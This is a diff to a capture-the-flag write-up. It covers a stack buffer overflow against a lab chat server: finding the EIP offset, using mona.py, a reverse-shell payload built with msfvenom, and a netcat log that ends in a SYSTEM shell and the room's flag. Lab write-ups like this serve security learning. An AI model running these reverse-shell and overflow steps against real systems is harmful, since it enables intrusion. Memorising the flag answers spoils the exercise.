@@ -148,13 +148,13 @@ mget essfunc.dll [anpqy?]? y
 30761 bytes received in 00:01 (16.23 KiB/s)
 ftp> 
 ```
-# Task 3:
+# Task 3: Access
 
 ### Q1: Read description of buffer overflow from the THM module 'Buffer Overflows x86-64). 
 Answer: Familiarise with THM buffer overflows module. 
 
 ### Q2: After testing for overflow, by entering a large number of characters, determine the EIP offset.
-Answer Task 3 Q2: 2012, see below where EIP determined after basic testing on chatserver. 
+Answer Q2 Task 3: 2012, see below where EIP determined after basic testing on chatserver. 
 
 There are two variables at start you see when chatserver is running first the user name followed by the message sent.
 
@@ -266,6 +266,7 @@ AAAAAAAAAA......AAAABBBB
 This effectively showed EIP replaced wtih 42424242 (last 4 B's), with EAX replaced with AAA...
 
 ### Q3 Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.
+Answer: determined using build in mona.py script, which needs to added to Immunity Debugger  first. Google corelan/mona (official repository), to find github repository. 
 
 Still using Immunity debugger, with the chatserver.exe loaded, in the bottom command bar enter:
 ```
@@ -426,6 +427,8 @@ except:
 	sys.exit()
 ```
 
+### Q4 Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows.
+Answer Q4 Task3: below, output will be encoded ready to use in payload
 When you build your final exploit, use:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -b "\x00" -f c
@@ -470,3 +473,22 @@ EIP pointing into the NOP sled → the JMP ESP has already fired and you now con
 
 That’s exactly what you want. 
 
+### Q After gaining access, what is the content of the root.txt file?
+Incorporate the payload from msfvenom into script above to connect with a netcat listener and then search for root.txt.
+
+```
+┌──(hacktopuser㉿hacktop)-[~]
+└─$ nc -lnvp 8443
+listening on [any] 8443 ...
+connect to [192.168.159.255] from (UNKNOWN) [10.49.161.157] 49302
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+C:\Windows\system32>dir \root.txt /s /b 2>nul
+C:\Users\drake\Desktop\root.txt
+C:\Windows\system32>type C:\Users\drake\Desktop\root.txt
+5b1001de5a44eca47eee71e7942a8f8a
+```
+Answer Q5 Task3: 5b1001de5a44eca47eee71e7942a8f8a
